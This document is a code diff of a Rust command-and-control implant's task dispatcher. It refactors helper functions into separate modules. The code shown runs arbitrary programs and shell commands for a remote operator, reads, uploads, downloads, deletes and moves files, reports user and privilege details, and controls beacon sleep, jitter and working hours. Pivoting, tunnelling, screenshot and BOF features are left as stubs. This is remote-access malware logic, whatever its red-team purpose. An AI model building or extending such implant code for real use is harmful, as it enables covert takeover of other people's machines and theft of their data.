@@ -2,11 +2,13 @@
 
 use crate::agent::Agent;
 use crate::protocol;
+use crate::runtime_common;
+use crate::runtime_fs;
+use crate::runtime_response;
 use std::env;
 use std::fs;
 use std::path::Path;
 use std::process::Command as ProcessCommand;
-use std::thread;
 use std::time::UNIX_EPOCH;
 
 pub fn process_tasks(agent: &mut Agent, objects: &[Vec<u8>]) -> Vec<Vec<u8>> {
@@ -30,76 +32,76 @@ fn dispatch(agent: &mut Agent, cmd: protocol::Command) -> Option<Vec<u8>> {
         }
         protocol::COMMAND_TERMINATE => {
             agent.active = false;
-            Some(complete_resp(protocol::COMMAND_TERMINATE, cmd.id))
+                Some(runtime_response::complete_resp(protocol::COMMAND_TERMINATE, cmd.id))
         }
         protocol::COMMAND_PWD => {
             let cwd = env::current_dir().map_err(|e| e.to_string());
             match cwd {
-                Ok(dir) => Some(ok_resp(protocol::COMMAND_PWD, cmd.id, &protocol::AnsPwd { path: dir.to_string_lossy().to_string() })),
-                Err(err) => Some(err_resp(cmd.id, &err)),
+                Ok(dir) => Some(runtime_response::ok_resp(protocol::COMMAND_PWD, cmd.id, &protocol::AnsPwd { path: dir.to_string_lossy().to_string() })),
+                Err(err) => Some(runtime_response::err_resp(cmd.id, &err)),
             }
         }
         protocol::COMMAND_CD => {
             let params: protocol::ParamsCd = decode(&cmd)?;
-            match env::set_current_dir(normalize_path(&params.path)) {
-                Ok(_) => Some(complete_resp(protocol::COMMAND_CD, cmd.id)),
-                Err(e) => Some(err_resp(cmd.id, &e.to_string())),
+            match env::set_current_dir(runtime_fs::normalize_path(&params.path)) {
+                Ok(_) => Some(runtime_response::complete_resp(protocol::COMMAND_CD, cmd.id)),
+                Err(e) => Some(runtime_response::err_resp(cmd.id, &e.to_string())),
             }
         }
         protocol::COMMAND_MKDIR => {
             let params: protocol::ParamsMkdir = decode(&cmd)?;
-            match fs::create_dir_all(normalize_path(&params.path)) {
-                Ok(_) => Some(complete_resp(protocol::COMMAND_MKDIR, cmd.id)),
-                Err(e) => Some(err_resp(cmd.id, &e.to_string())),
+            match fs::create_dir_all(runtime_fs::normalize_path(&params.path)) {
+                Ok(_) => Some(runtime_response::complete_resp(protocol::COMMAND_MKDIR, cmd.id)),
+                Err(e) => Some(runtime_response::err_resp(cmd.id, &e.to_string())),
             }
         }
         protocol::COMMAND_RM => {
             let params: protocol::ParamsRm = decode(&cmd)?;
-            let path = normalize_path(&params.path);
+            let path = runtime_fs::normalize_path(&params.path);
             let res = if path.is_dir() { fs::remove_dir_all(&path) } else { fs::remove_file(&path) };
             match res {
-                Ok(_) => Some(complete_resp(protocol::COMMAND_RM, cmd.id)),
-                Err(e) => Some(err_resp(cmd.id, &e.to_string())),
+                Ok(_) => Some(runtime_response::complete_resp(protocol::COMMAND_RM, cmd.id)),
+                Err(e) => Some(runtime_response::err_resp(cmd.id, &e.to_string())),
             }
         }
         protocol::COMMAND_MV => {
             let params: protocol::ParamsMv = decode(&cmd)?;
-            match fs::rename(normalize_path(&params.src), normalize_path(&params.dst)) {
-                Ok(_) => Some(complete_resp(protocol::COMMAND_MV, cmd.id)),
-                Err(e) => Some(err_resp(cmd.id, &e.to_string())),
+            match fs::rename(runtime_fs::normalize_path(&params.src), runtime_fs::normalize_path(&params.dst)) {
+                Ok(_) => Some(runtime_response::complete_resp(protocol::COMMAND_MV, cmd.id)),
+                Err(e) => Some(runtime_response::err_resp(cmd.id, &e.to_string())),
             }
         }
         protocol::COMMAND_CP => {
             let params: protocol::ParamsCp = decode(&cmd)?;
-            match copy_recursive(&normalize_path(&params.src), &normalize_path(&params.dst)) {
-                Ok(_) => Some(complete_resp(protocol::COMMAND_CP, cmd.id)),
-                Err(err) => Some(err_resp(cmd.id, &err)),
+            match runtime_fs::copy_recursive(&runtime_fs::normalize_path(&params.src), &runtime_fs::normalize_path(&params.dst)) {
+                Ok(_) => Some(runtime_response::complete_resp(protocol::COMMAND_CP, cmd.id)),
+                Err(err) => Some(runtime_response::err_resp(cmd.id, &err)),
             }
         }
         protocol::COMMAND_CAT => {
             let params: protocol::ParamsCat = decode(&cmd)?;
             let raw_path = params.path.clone();
-            match fs::read(normalize_path(&params.path)) {
-                Ok(content) => Some(ok_resp(protocol::COMMAND_CAT, cmd.id, &protocol::AnsCat { path: raw_path, content })),
-                Err(e) => Some(err_resp(cmd.id, &e.to_string())),
+            match fs::read(runtime_fs::normalize_path(&params.path)) {
+                Ok(content) => Some(runtime_response::ok_resp(protocol::COMMAND_CAT, cmd.id, &protocol::AnsCat { path: raw_path, content })),
+                Err(e) => Some(runtime_response::err_resp(cmd.id, &e.to_string())),
             }
         }
         protocol::COMMAND_UPLOAD => {
             let params: protocol::ParamsUpload = decode(&cmd)?;
-            let path = normalize_path(&params.path);
+            let path = runtime_fs::normalize_path(&params.path);
             if let Some(parent) = path.parent() {
                 let _ = fs::create_dir_all(parent);
             }
             match fs::write(&path, &params.content) {
-                Ok(_) => Some(ok_resp(protocol::COMMAND_UPLOAD, cmd.id, &protocol::AnsUpload { path: path.to_string_lossy().to_string() })),
-                Err(e) => Some(err_resp(cmd.id, &e.to_string())),
+                Ok(_) => Some(runtime_response::ok_resp(protocol::COMMAND_UPLOAD, cmd.id, &protocol::AnsUpload { path: path.to_string_lossy().to_string() })),
+                Err(e) => Some(runtime_response::err_resp(cmd.id, &e.to_string())),
             }
         }
         protocol::COMMAND_DOWNLOAD => {
             let params: protocol::ParamsDownload = decode(&cmd)?;
-            let path = normalize_path(&params.path);
+            let path = runtime_fs::normalize_path(&params.path);
             match fs::read(&path) {
-                Ok(content) => Some(ok_resp(protocol::COMMAND_DOWNLOAD, cmd.id, &protocol::AnsDownload {
+                Ok(content) => Some(runtime_response::ok_resp(protocol::COMMAND_DOWNLOAD, cmd.id, &protocol::AnsDownload {
                     file_id: 0,
                     path: path.to_string_lossy().to_string(),
                     size: content.len() as i32,
@@ -108,43 +110,43 @@ fn dispatch(agent: &mut Agent, cmd: protocol::Command) -> Option<Vec<u8>> {
                     finish: true,
                     canceled: false,
                 })),
-                Err(e) => Some(err_resp(cmd.id, &e.to_string())),
+                Err(e) => Some(runtime_response::err_resp(cmd.id, &e.to_string())),
             }
         }
         protocol::COMMAND_LS => {
             let params: protocol::ParamsLs = decode(&cmd)?;
-            let path = normalize_path(&params.path);
+            let path = runtime_fs::normalize_path(&params.path);
             match build_listing(&path) {
-                Ok(files_blob) => Some(ok_resp(protocol::COMMAND_LS, cmd.id, &protocol::AnsLs {
+                Ok(files_blob) => Some(runtime_response::ok_resp(protocol::COMMAND_LS, cmd.id, &protocol::AnsLs {
                     result: true,
                     status: String::new(),
                     path: path.to_string_lossy().to_string(),
                     files: files_blob,
                 })),
-                Err(err) => Some(err_resp(cmd.id, &err)),
+                Err(err) => Some(runtime_response::err_resp(cmd.id, &err)),
             }
         }
         protocol::COMMAND_RUN => {
             let params: protocol::ParamsRun = decode(&cmd)?;
             match ProcessCommand::new(&params.program).args(&params.args).output() {
-                Ok(out) => Some(ok_resp(protocol::COMMAND_RUN, cmd.id, &protocol::AnsRun {
+                Ok(out) => Some(runtime_response::ok_resp(protocol::COMMAND_RUN, cmd.id, &protocol::AnsRun {
                     stdout: String::from_utf8_lossy(&out.stdout).to_string(),
                     stderr: String::from_utf8_lossy(&out.stderr).to_string(),
                     pid: 0,
                     start: true,
                     finish: true,
                 })),
-                Err(e) => Some(err_resp(cmd.id, &e.to_string())),
+                Err(e) => Some(runtime_response::err_resp(cmd.id, &e.to_string())),
             }
         }
         protocol::COMMAND_SHELL => {
             let params: protocol::ParamsShell = decode(&cmd)?;
             let output = ProcessCommand::new(&params.program).args(&params.args).output();
             match output {
-                Ok(out) => Some(ok_resp(protocol::COMMAND_SHELL, cmd.id, &protocol::AnsShell {
+                Ok(out) => Some(runtime_response::ok_resp(protocol::COMMAND_SHELL, cmd.id, &protocol::AnsShell {
                     output: String::from_utf8_lossy(&out.stdout).to_string(),
                 })),
-                Err(e) => Some(err_resp(cmd.id, &e.to_string())),
+                Err(e) => Some(runtime_response::err_resp(cmd.id, &e.to_string())),
             }
         }
         protocol::COMMAND_KILL => {
@@ -157,16 +159,16 @@ fn dispatch(agent: &mut Agent, cmd: protocol::Command) -> Option<Vec<u8>> {
             let status: Result<std::process::ExitStatus, std::io::Error> = Err(std::io::Error::new(std::io::ErrorKind::Other, "unsupported platform"));
 
             match status {
-                Ok(s) if s.success() => Some(complete_resp(protocol::COMMAND_KILL, cmd.id)),
-                Ok(_) => Some(err_resp(cmd.id, "process termination failed")),
-                Err(e) => Some(err_resp(cmd.id, &e.to_string())),
+                Ok(s) if s.success() => Some(runtime_response::complete_resp(protocol::COMMAND_KILL, cmd.id)),
+                Ok(_) => Some(runtime_response::err_resp(cmd.id, "process termination failed")),
+                Err(e) => Some(runtime_response::err_resp(cmd.id, &e.to_string())),
             }
         }
         protocol::COMMAND_SLEEP => {
             let params: protocol::ParamsSleep = decode(&cmd)?;
             agent.sleep_secs = params.sleep;
             agent.jitter = params.jitter;
-            Some(ok_resp(protocol::COMMAND_SLEEP, cmd.id, &protocol::AnsSleep { sleep: params.sleep, jitter: params.jitter }))
+            Some(runtime_response::ok_resp(protocol::COMMAND_SLEEP, cmd.id, &protocol::AnsSleep { sleep: params.sleep, jitter: params.jitter }))
         }
         protocol::COMMAND_PROFILE => {
             let params: protocol::ParamsProfile = decode(&cmd)?;
@@ -177,20 +179,20 @@ fn dispatch(agent: &mut Agent, cmd: protocol::Command) -> Option<Vec<u8>> {
                 4 => {
                     let (start, end) = match parse_working_time(&params.str_value) {
                         Ok(v) => v,
-                        Err(err) => return Some(err_resp(cmd.id, &err)),
+                        Err(err) => return Some(runtime_response::err_resp(cmd.id, &err)),
                     };
                     agent.work_start = start;
                     agent.work_end = end;
                     ans.str_value = format_working_time(start, end);
                 }
-                _ => return Some(err_resp(cmd.id, &format!("unsupported profile subcmd {}", params.subcmd))),
+                _ => return Some(runtime_response::err_resp(cmd.id, &format!("unsupported profile subcmd {}", params.subcmd))),
             }
-            Some(ok_resp(protocol::COMMAND_PROFILE, cmd.id, &ans))
+            Some(runtime_response::ok_resp(protocol::COMMAND_PROFILE, cmd.id, &ans))
         }
         protocol::COMMAND_BURST => {
             let params: protocol::ParamsBurst = decode(&cmd)?;
             match params.subcmd {
-                1 => Some(ok_resp(protocol::COMMAND_BURST, cmd.id, &protocol::AnsBurst {
+                1 => Some(runtime_response::ok_resp(protocol::COMMAND_BURST, cmd.id, &protocol::AnsBurst {
                     enabled: agent.burst_enabled,
                     sleep: agent.burst_sleep,
                     jitter: agent.burst_jitter,
@@ -199,90 +201,55 @@ fn dispatch(agent: &mut Agent, cmd: protocol::Command) -> Option<Vec<u8>> {
                     agent.burst_enabled = params.enabled;
                     agent.burst_sleep = params.sleep;
                     agent.burst_jitter = params.jitter;
-                    Some(ok_resp(protocol::COMMAND_BURST, cmd.id, &protocol::AnsBurst {
+                    Some(runtime_response::ok_resp(protocol::COMMAND_BURST, cmd.id, &protocol::AnsBurst {
                         enabled: agent.burst_enabled,
                         sleep: agent.burst_sleep,
                         jitter: agent.burst_jitter,
                     }))
                 }
-                _ => Some(err_resp(cmd.id, &format!("unsupported burst subcmd {}", params.subcmd))),
+                _ => Some(runtime_response::err_resp(cmd.id, &format!("unsupported burst subcmd {}", params.subcmd))),
             }
         }
-        protocol::COMMAND_GETUID => Some(ok_resp(protocol::COMMAND_GETUID, cmd.id, &protocol::AnsGetuid {
+        protocol::COMMAND_GETUID => Some(runtime_response::ok_resp(protocol::COMMAND_GETUID, cmd.id, &protocol::AnsGetuid {
             username: env::var("USER").or_else(|_| env::var("USERNAME")).unwrap_or_default(),
             domain: env::var("USERDOMAIN").unwrap_or_default(),
-            elevated: is_elevated(),
+            elevated: runtime_common::is_elevated(),
         })),
         protocol::COMMAND_DISKS => match build_drives() {
-            Ok(drives_blob) => Some(ok_resp(protocol::COMMAND_DISKS, cmd.id, &protocol::AnsDisks { drives: drives_blob })),
-            Err(err) => Some(err_resp(cmd.id, &err)),
+            Ok(drives_blob) => Some(runtime_response::ok_resp(protocol::COMMAND_DISKS, cmd.id, &protocol::AnsDisks { drives: drives_blob })),
+            Err(err) => Some(runtime_response::err_resp(cmd.id, &err)),
         },
         protocol::COMMAND_JOB_LIST => {
             let entries: Vec<protocol::JobInfo> = Vec::new();
             let list = protocol::marshal(&entries).unwrap_or_default();
-            Some(ok_resp(protocol::COMMAND_JOB_LIST, cmd.id, &protocol::AnsJobList { list }))
+            Some(runtime_response::ok_resp(protocol::COMMAND_JOB_LIST, cmd.id, &protocol::AnsJobList { list }))
         }
-        protocol::COMMAND_JOB_KILL => Some(complete_resp(protocol::COMMAND_JOB_KILL, cmd.id)),
-        protocol::COMMAND_LINK => Some(err_resp(cmd.id, "pivot link requires a transport extension in this scaffold")),
-        protocol::COMMAND_UNLINK => Some(err_resp(cmd.id, "pivot unlink requires a transport extension in this scaffold")),
-        protocol::COMMAND_PIVOT_EXEC => Some(err_resp(cmd.id, "pivot data routing requires a transport extension in this scaffold")),
-        protocol::COMMAND_TUNNEL_START => Some(err_resp(cmd.id, "tunnel start requires a transport extension in this scaffold")),
-        protocol::COMMAND_TUNNEL_STOP => Some(err_resp(cmd.id, "tunnel stop requires a transport extension in this scaffold")),
-        protocol::COMMAND_TUNNEL_PAUSE => Some(err_resp(cmd.id, "tunnel pause requires a transport extension in this scaffold")),
-        protocol::COMMAND_TUNNEL_RESUME => Some(err_resp(cmd.id, "tunnel resume requires a transport extension in this scaffold")),
-        protocol::COMMAND_TUNNEL_REVERSE => Some(err_resp(cmd.id, "reverse tunnel requires a transport extension in this scaffold")),
-        protocol::COMMAND_LPORTFWD_START => Some(err_resp(cmd.id, "local port forwarding requires a transport extension in this scaffold")),
-        protocol::COMMAND_LPORTFWD_STOP => Some(err_resp(cmd.id, "local port forwarding requires a transport extension in this scaffold")),
-        protocol::COMMAND_RPORTFWD_START => Some(err_resp(cmd.id, "reverse port forwarding requires a transport extension in this scaffold")),
-        protocol::COMMAND_RPORTFWD_STOP => Some(err_resp(cmd.id, "reverse port forwarding requires a transport extension in this scaffold")),
-        protocol::COMMAND_TERMINAL_START => Some(err_resp(cmd.id, "interactive terminal requires a platform extension in this scaffold")),
-        protocol::COMMAND_TERMINAL_STOP => Some(err_resp(cmd.id, "interactive terminal requires a platform extension in this scaffold")),
-        protocol::COMMAND_PS => Some(err_resp(cmd.id, "process enumeration requires a platform extension in this scaffold")),
-        protocol::COMMAND_SCREENSHOT => Some(err_resp(cmd.id, "screen capture requires a platform extension in this scaffold")),
-        protocol::COMMAND_ZIP => Some(err_resp(cmd.id, "archive creation requires a platform extension in this scaffold")),
-        protocol::COMMAND_EXEC_BOF | protocol::COMMAND_EXEC_BOF_ASYNC => Some(err_resp(cmd.id, "BOF execution requires a native loader extension")),
-        protocol::COMMAND_REV2SELF => Some(complete_resp(protocol::COMMAND_REV2SELF, cmd.id)),
-        _ => Some(err_resp(cmd.id, &format!("unknown command code {}", cmd.code))),
+        protocol::COMMAND_JOB_KILL => Some(runtime_response::complete_resp(protocol::COMMAND_JOB_KILL, cmd.id)),
+        protocol::COMMAND_LINK => Some(runtime_response::err_resp(cmd.id, "pivot link requires a transport extension in this scaffold")),
+        protocol::COMMAND_UNLINK => Some(runtime_response::err_resp(cmd.id, "pivot unlink requires a transport extension in this scaffold")),
+        protocol::COMMAND_PIVOT_EXEC => Some(runtime_response::err_resp(cmd.id, "pivot data routing requires a transport extension in this scaffold")),
+        protocol::COMMAND_TUNNEL_START => Some(runtime_response::err_resp(cmd.id, "tunnel start requires a transport extension in this scaffold")),
+        protocol::COMMAND_TUNNEL_STOP => Some(runtime_response::err_resp(cmd.id, "tunnel stop requires a transport extension in this scaffold")),
+        protocol::COMMAND_TUNNEL_PAUSE => Some(runtime_response::err_resp(cmd.id, "tunnel pause requires a transport extension in this scaffold")),
+        protocol::COMMAND_TUNNEL_RESUME => Some(runtime_response::err_resp(cmd.id, "tunnel resume requires a transport extension in this scaffold")),
+        protocol::COMMAND_TUNNEL_REVERSE => Some(runtime_response::err_resp(cmd.id, "reverse tunnel requires a transport extension in this scaffold")),
+        protocol::COMMAND_LPORTFWD_START => Some(runtime_response::err_resp(cmd.id, "local port forwarding requires a transport extension in this scaffold")),
+        protocol::COMMAND_LPORTFWD_STOP => Some(runtime_response::err_resp(cmd.id, "local port forwarding requires a transport extension in this scaffold")),
+        protocol::COMMAND_RPORTFWD_START => Some(runtime_response::err_resp(cmd.id, "reverse port forwarding requires a transport extension in this scaffold")),
+        protocol::COMMAND_RPORTFWD_STOP => Some(runtime_response::err_resp(cmd.id, "reverse port forwarding requires a transport extension in this scaffold")),
+        protocol::COMMAND_TERMINAL_START => Some(runtime_response::err_resp(cmd.id, "interactive terminal requires a platform extension in this scaffold")),
+        protocol::COMMAND_TERMINAL_STOP => Some(runtime_response::err_resp(cmd.id, "interactive terminal requires a platform extension in this scaffold")),
+        protocol::COMMAND_PS => Some(runtime_response::err_resp(cmd.id, "process enumeration requires a platform extension in this scaffold")),
+        protocol::COMMAND_SCREENSHOT => Some(runtime_response::err_resp(cmd.id, "screen capture requires a platform extension in this scaffold")),
+        protocol::COMMAND_ZIP => Some(runtime_response::err_resp(cmd.id, "archive creation requires a platform extension in this scaffold")),
+        protocol::COMMAND_EXEC_BOF | protocol::COMMAND_EXEC_BOF_ASYNC => Some(runtime_response::err_resp(cmd.id, "BOF execution requires a native loader extension")),
+        protocol::COMMAND_REV2SELF => Some(runtime_response::complete_resp(protocol::COMMAND_REV2SELF, cmd.id)),
+        _ => Some(runtime_response::err_resp(cmd.id, &format!("unknown command code {}", cmd.code))),
     }
 }
 
 fn decode<T: serde::de::DeserializeOwned>(cmd: &protocol::Command) -> Option<T> {
     protocol::unmarshal(&cmd.data).ok()
-}
-
-fn ok_resp<T: serde::Serialize>(code: u32, id: u32, payload: &T) -> Vec<u8> {
-    let data = protocol::marshal(payload).unwrap_or_default();
-    protocol::marshal(&protocol::Command { code, id, data }).unwrap_or_default()
-}
-
-fn complete_resp(code: u32, id: u32) -> Vec<u8> {
-    protocol::marshal(&protocol::Command { code, id, data: Vec::new() }).unwrap_or_default()
-}
-
-fn err_resp(id: u32, msg: &str) -> Vec<u8> {
-    let data = protocol::marshal(&protocol::AnsError { error: msg.to_string() }).unwrap_or_default();
-    protocol::marshal(&protocol::Command { code: protocol::COMMAND_ERROR, id, data }).unwrap_or_default()
-}
-
-fn normalize_path(path: &str) -> std::path::PathBuf {
-    if path.is_empty() || path == "." {
-        env::current_dir().unwrap_or_else(|_| Path::new(".").to_path_buf())
-    } else {
-        Path::new(path).to_path_buf()
-    }
-}
-
-fn copy_recursive(src: &Path, dst: &Path) -> Result<(), String> {
-    if src.is_dir() {
-        fs::create_dir_all(dst).map_err(|e| e.to_string())?;
-        for entry in fs::read_dir(src).map_err(|e| e.to_string())? {
-            let entry = entry.map_err(|e| e.to_string())?;
-            copy_recursive(&entry.path(), &dst.join(entry.file_name()))?;
-        }
-        Ok(())
-    } else {
-        fs::copy(src, dst).map_err(|e| e.to_string()).map(|_| ())
-    }
 }
 
 fn build_listing(path: &Path) -> Result<Vec<u8>, String> {
@@ -354,13 +321,3 @@ fn format_working_time(start: i32, end: i32) -> String {
     format!("{:02}:{:02}-{:02}:{:02}", start / 100, start % 100, end / 100, end % 100)
 }
 
-fn is_elevated() -> bool {
-    #[cfg(unix)]
-    {
-        unsafe { libc::geteuid() == 0 }
-    }
-    #[cfg(not(unix))]
-    {
-        false
-    }
-}
